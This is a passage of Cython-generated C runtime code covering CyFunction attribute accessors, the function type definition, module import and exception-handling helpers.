#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__name__ must be set to a string object");
        return -1;
    }
    tmp = op->func_name;
    Py_INCREF(value);
    op->func_name = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_qualname(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_qualname);
    return op->func_qualname;
}
static int
__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
#if PY_MAJOR_VERSION >= 3
    if (unlikely(value == NULL || !PyUnicode_Check(value)))
#else
    if (unlikely(value == NULL || !PyString_Check(value)))
#endif
    {
        PyErr_SetString(PyExc_TypeError,
                        "__qualname__ must be set to a string object");
        return -1;
    }
    tmp = op->func_qualname;
    Py_INCREF(value);
    op->func_qualname = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)
{
    PyObject *self;
    self = m->func_closure;
    if (self == NULL)
        self = Py_None;
    Py_INCREF(self);
    return self;
}
static PyObject *
__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    if (unlikely(op->func_dict == NULL)) {
        op->func_dict = PyDict_New();
        if (unlikely(op->func_dict == NULL))
            return NULL;
    }
    Py_INCREF(op->func_dict);
    return op->func_dict;
}
static int
__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)
{
    PyObject *tmp;
    if (unlikely(value == NULL)) {
        PyErr_SetString(PyExc_TypeError,
               "function's dictionary may not be deleted");
        return -1;
    }
    if (unlikely(!PyDict_Check(value))) {
        PyErr_SetString(PyExc_TypeError,
               "setting function's dictionary to a non-dict");
        return -1;
    }
    tmp = op->func_dict;
    Py_INCREF(value);
    op->func_dict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(op->func_globals);
    return op->func_globals;
}
static PyObject *
__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    Py_INCREF(Py_None);
    return Py_None;
}
static PyObject *
__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)
{
    PyObject* result = (op->func_code) ? op->func_code : Py_None;
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {
    int result = 0;
    PyObject *res = op->defaults_getter((PyObject *) op);
    if (unlikely(!res))
        return -1;
    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);
    Py_INCREF(op->defaults_tuple);
    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);
    Py_INCREF(op->defaults_kwdict);
    #else
    op->defaults_tuple = PySequence_ITEM(res, 0);
    if (unlikely(!op->defaults_tuple)) result = -1;
    else {
        op->defaults_kwdict = PySequence_ITEM(res, 1);
        if (unlikely(!op->defaults_kwdict)) result = -1;
    }
    #endif
    Py_DECREF(res);
    return result;
}
static int
__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyTuple_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__defaults__ must be set to a tuple object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_tuple;
    op->defaults_tuple = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_tuple;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_tuple;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value) {
        value = Py_None;
    } else if (value != Py_None && !PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__kwdefaults__ must be set to a dict object");
        return -1;
    }
    Py_INCREF(value);
    tmp = op->defaults_kwdict;
    op->defaults_kwdict = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->defaults_kwdict;
    if (unlikely(!result)) {
        if (op->defaults_getter) {
            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;
            result = op->defaults_kwdict;
        } else {
            result = Py_None;
        }
    }
    Py_INCREF(result);
    return result;
}
static int
__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {
    PyObject* tmp;
    if (!value || value == Py_None) {
        value = NULL;
    } else if (!PyDict_Check(value)) {
        PyErr_SetString(PyExc_TypeError,
                        "__annotations__ must be set to a dict object");
        return -1;
    }
    Py_XINCREF(value);
    tmp = op->func_annotations;
    op->func_annotations = value;
    Py_XDECREF(tmp);
    return 0;
}
static PyObject *
__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {
    PyObject* result = op->func_annotations;
    if (unlikely(!result)) {
        result = PyDict_New();
        if (unlikely(!result)) return NULL;
        op->func_annotations = result;
    }
    Py_INCREF(result);
    return result;
}
static PyGetSetDef __pyx_CyFunction_getsets[] = {
    {(char *) "func_doc", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "__doc__",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},
    {(char *) "func_name", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__name__", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},
    {(char *) "__qualname__", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},
    {(char *) "__self__", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},
    {(char *) "func_dict", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "__dict__", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},
    {(char *) "func_globals", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "__globals__", (getter)__Pyx_CyFunction_get_globals, 0, 0, 0},
    {(char *) "func_closure", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "__closure__", (getter)__Pyx_CyFunction_get_closure, 0, 0, 0},
    {(char *) "func_code", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "__code__", (getter)__Pyx_CyFunction_get_code, 0, 0, 0},
    {(char *) "func_defaults", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__defaults__", (getter)__Pyx_CyFunction_get_defaults, (setter)__Pyx_CyFunction_set_defaults, 0, 0},
    {(char *) "__kwdefaults__", (getter)__Pyx_CyFunction_get_kwdefaults, (setter)__Pyx_CyFunction_set_kwdefaults, 0, 0},
    {(char *) "__annotations__", (getter)__Pyx_CyFunction_get_annotations, (setter)__Pyx_CyFunction_set_annotations, 0, 0},
    {0, 0, 0, 0, 0}
};
static PyMemberDef __pyx_CyFunction_members[] = {
    {(char *) "__module__", T_OBJECT, offsetof(PyCFunctionObject, m_module), PY_WRITE_RESTRICTED, 0},
    {0, 0, 0,  0, 0}
};
static PyObject *
__Pyx_CyFunction_reduce(__pyx_CyFunctionObject *m, CYTHON_UNUSED PyObject *args)
{
#if PY_MAJOR_VERSION >= 3
    Py_INCREF(m->func_qualname);
    return m->func_qualname;
#else
    return PyString_FromString(m->func.m_ml->ml_name);
#endif
}
static PyMethodDef __pyx_CyFunction_methods[] = {
    {"__reduce__", (PyCFunction)__Pyx_CyFunction_reduce, METH_VARARGS, 0},
    {0, 0, 0, 0}
};
#if PY_VERSION_HEX < 0x030500A0
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func_weakreflist)
#else
#define __Pyx_CyFunction_weakreflist(cyfunc) ((cyfunc)->func.m_weakreflist)
#endif
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject *op, PyMethodDef *ml, int flags, PyObject* qualname,
                                       PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    if (unlikely(op == NULL))
        return NULL;
    op->flags = flags;
    __Pyx_CyFunction_weakreflist(op) = NULL;
    op->func.m_ml = ml;
    op->func.m_self = (PyObject *) op;
    Py_XINCREF(closure);
    op->func_closure = closure;
    Py_XINCREF(module);
    op->func.m_module = module;
    op->func_dict = NULL;
    op->func_name = NULL;
    Py_INCREF(qualname);
    op->func_qualname = qualname;
    op->func_doc = NULL;
    op->func_classobj = NULL;
    op->func_globals = globals;
    Py_INCREF(op->func_globals);
    Py_XINCREF(code);
    op->func_code = code;
    op->defaults_pyobjects = 0;
    op->defaults_size = 0;
    op->defaults = NULL;
    op->defaults_tuple = NULL;
    op->defaults_kwdict = NULL;
    op->defaults_getter = NULL;
    op->func_annotations = NULL;
    return (PyObject *) op;
}
static int
__Pyx_CyFunction_clear(__pyx_CyFunctionObject *m)
{
    Py_CLEAR(m->func_closure);
    Py_CLEAR(m->func.m_module);
    Py_CLEAR(m->func_dict);
    Py_CLEAR(m->func_name);
    Py_CLEAR(m->func_qualname);
    Py_CLEAR(m->func_doc);
    Py_CLEAR(m->func_globals);
    Py_CLEAR(m->func_code);
    Py_CLEAR(m->func_classobj);
    Py_CLEAR(m->defaults_tuple);
    Py_CLEAR(m->defaults_kwdict);
    Py_CLEAR(m->func_annotations);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_XDECREF(pydefaults[i]);
        PyObject_Free(m->defaults);
        m->defaults = NULL;
    }
    return 0;
}
static void __Pyx__CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    if (__Pyx_CyFunction_weakreflist(m) != NULL)
        PyObject_ClearWeakRefs((PyObject *) m);
    __Pyx_CyFunction_clear(m);
    PyObject_GC_Del(m);
}
static void __Pyx_CyFunction_dealloc(__pyx_CyFunctionObject *m)
{
    PyObject_GC_UnTrack(m);
    __Pyx__CyFunction_dealloc(m);
}
static int __Pyx_CyFunction_traverse(__pyx_CyFunctionObject *m, visitproc visit, void *arg)
{
    Py_VISIT(m->func_closure);
    Py_VISIT(m->func.m_module);
    Py_VISIT(m->func_dict);
    Py_VISIT(m->func_name);
    Py_VISIT(m->func_qualname);
    Py_VISIT(m->func_doc);
    Py_VISIT(m->func_globals);
    Py_VISIT(m->func_code);
    Py_VISIT(m->func_classobj);
    Py_VISIT(m->defaults_tuple);
    Py_VISIT(m->defaults_kwdict);
    if (m->defaults) {
        PyObject **pydefaults = __Pyx_CyFunction_Defaults(PyObject *, m);
        int i;
        for (i = 0; i < m->defaults_pyobjects; i++)
            Py_VISIT(pydefaults[i]);
    }
    return 0;
}
static PyObject *__Pyx_CyFunction_descr_get(PyObject *func, PyObject *obj, PyObject *type)
{
#if PY_MAJOR_VERSION < 3
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    if (m->flags & __Pyx_CYFUNCTION_STATICMETHOD) {
        Py_INCREF(func);
        return func;
    }
    if (m->flags & __Pyx_CYFUNCTION_CLASSMETHOD) {
        if (type == NULL)
            type = (PyObject *)(Py_TYPE(obj));
        return __Pyx_PyMethod_New(func, type, (PyObject *)(Py_TYPE(type)));
    }
    if (obj == Py_None)
        obj = NULL;
#endif
    return __Pyx_PyMethod_New(func, obj, type);
}
static PyObject*
__Pyx_CyFunction_repr(__pyx_CyFunctionObject *op)
{
#if PY_MAJOR_VERSION >= 3
    return PyUnicode_FromFormat("<cyfunction %U at %p>",
                                op->func_qualname, (void *)op);
#else
    return PyString_FromFormat("<cyfunction %s at %p>",
                               PyString_AsString(op->func_qualname), (void *)op);
#endif
}
static PyObject * __Pyx_CyFunction_CallMethod(PyObject *func, PyObject *self, PyObject *arg, PyObject *kw) {
    PyCFunctionObject* f = (PyCFunctionObject*)func;
    PyCFunction meth = f->m_ml->ml_meth;
    Py_ssize_t size;
    switch (f->m_ml->ml_flags & (METH_VARARGS | METH_KEYWORDS | METH_NOARGS | METH_O)) {
    case METH_VARARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0))
            return (*meth)(self, arg);
        break;
    case METH_VARARGS | METH_KEYWORDS:
        return (*(PyCFunctionWithKeywords)(void*)meth)(self, arg, kw);
    case METH_NOARGS:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 0))
                return (*meth)(self, NULL);
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes no arguments (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    case METH_O:
        if (likely(kw == NULL || PyDict_Size(kw) == 0)) {
            size = PyTuple_GET_SIZE(arg);
            if (likely(size == 1)) {
                PyObject *result, *arg0;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                arg0 = PyTuple_GET_ITEM(arg, 0);
                #else
                arg0 = PySequence_ITEM(arg, 0); if (unlikely(!arg0)) return NULL;
                #endif
                result = (*meth)(self, arg0);
                #if !(CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS)
                Py_DECREF(arg0);
                #endif
                return result;
            }
            PyErr_Format(PyExc_TypeError,
                "%.200s() takes exactly one argument (%" CYTHON_FORMAT_SSIZE_T "d given)",
                f->m_ml->ml_name, size);
            return NULL;
        }
        break;
    default:
        PyErr_SetString(PyExc_SystemError, "Bad call flags in "
                        "__Pyx_CyFunction_Call. METH_OLDARGS is no "
                        "longer supported!");
        return NULL;
    }
    PyErr_Format(PyExc_TypeError, "%.200s() takes no keyword arguments",
                 f->m_ml->ml_name);
    return NULL;
}
static CYTHON_INLINE PyObject *__Pyx_CyFunction_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    return __Pyx_CyFunction_CallMethod(func, ((PyCFunctionObject*)func)->m_self, arg, kw);
}
static PyObject *__Pyx_CyFunction_CallAsMethod(PyObject *func, PyObject *args, PyObject *kw) {
    PyObject *result;
    __pyx_CyFunctionObject *cyfunc = (__pyx_CyFunctionObject *) func;
    if ((cyfunc->flags & __Pyx_CYFUNCTION_CCLASS) && !(cyfunc->flags & __Pyx_CYFUNCTION_STATICMETHOD)) {
        Py_ssize_t argc;
        PyObject *new_args;
        PyObject *self;
        argc = PyTuple_GET_SIZE(args);
        new_args = PyTuple_GetSlice(args, 1, argc);
        if (unlikely(!new_args))
            return NULL;
        self = PyTuple_GetItem(args, 0);
        if (unlikely(!self)) {
            Py_DECREF(new_args);
#if PY_MAJOR_VERSION > 2
            PyErr_Format(PyExc_TypeError,
                         "unbound method %.200S() needs an argument",
                         cyfunc->func_qualname);
#else
            PyErr_SetString(PyExc_TypeError,
                            "unbound method needs an argument");
#endif
            return NULL;
        }
        result = __Pyx_CyFunction_CallMethod(func, self, new_args, kw);
        Py_DECREF(new_args);
    } else {
        result = __Pyx_CyFunction_Call(func, args, kw);
    }
    return result;
}
static PyTypeObject __pyx_CyFunctionType_type = {
    PyVarObject_HEAD_INIT(0, 0)
    "cython_function_or_method",
    sizeof(__pyx_CyFunctionObject),
    0,
    (destructor) __Pyx_CyFunction_dealloc,
    0,
    0,
    0,
#if PY_MAJOR_VERSION < 3
    0,
#else
    0,
#endif
    (reprfunc) __Pyx_CyFunction_repr,
    0,
    0,
    0,
    0,
    __Pyx_CyFunction_CallAsMethod,
    0,
    0,
    0,
    0,
    Py_TPFLAGS_DEFAULT | Py_TPFLAGS_HAVE_GC,
    0,
    (traverseproc) __Pyx_CyFunction_traverse,
    (inquiry) __Pyx_CyFunction_clear,
    0,
#if PY_VERSION_HEX < 0x030500A0
    offsetof(__pyx_CyFunctionObject, func_weakreflist),
#else
    offsetof(PyCFunctionObject, m_weakreflist),
#endif
    0,
    0,
    __pyx_CyFunction_methods,
    __pyx_CyFunction_members,
    __pyx_CyFunction_getsets,
    0,
    0,
    __Pyx_CyFunction_descr_get,
    0,
    offsetof(__pyx_CyFunctionObject, func_dict),
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
    0,
#if PY_VERSION_HEX >= 0x030400a1
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b1 && (!CYTHON_COMPILING_IN_PYPY || PYPY_VERSION_NUM >= 0x07030800)
    0,
#endif
#if PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000
    0,
#endif
#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX >= 0x03090000
    0,
#endif
};
static int __pyx_CyFunction_init(void) {
    __pyx_CyFunctionType = __Pyx_FetchCommonType(&__pyx_CyFunctionType_type);
    if (unlikely(__pyx_CyFunctionType == NULL)) {
        return -1;
    }
    return 0;
}
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *func, size_t size, int pyobjects) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults = PyObject_Malloc(size);
    if (unlikely(!m->defaults))
        return PyErr_NoMemory();
    memset(m->defaults, 0, size);
    m->defaults_pyobjects = pyobjects;
    m->defaults_size = size;
    return m->defaults;
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *func, PyObject *tuple) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_tuple = tuple;
    Py_INCREF(tuple);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->defaults_kwdict = dict;
    Py_INCREF(dict);
}
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *func, PyObject *dict) {
    __pyx_CyFunctionObject *m = (__pyx_CyFunctionObject *) func;
    m->func_annotations = dict;
    Py_INCREF(dict);
}

/* CythonFunction */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml, int flags, PyObject* qualname,
                                      PyObject *closure, PyObject *module, PyObject* globals, PyObject* code) {
    PyObject *op = __Pyx_CyFunction_Init(
        PyObject_GC_New(__pyx_CyFunctionObject, __pyx_CyFunctionType),
        ml, flags, qualname, closure, module, globals, code
    );
    if (likely(op)) {
        PyObject_GC_Track(op);
    }
    return op;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* RaiseException */
#if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb,
                        CYTHON_UNUSED PyObject *cause) {
    __Pyx_PyThreadState_declare
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#else
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* PyObject_GenericGetAttrNoDict */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* SwapException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
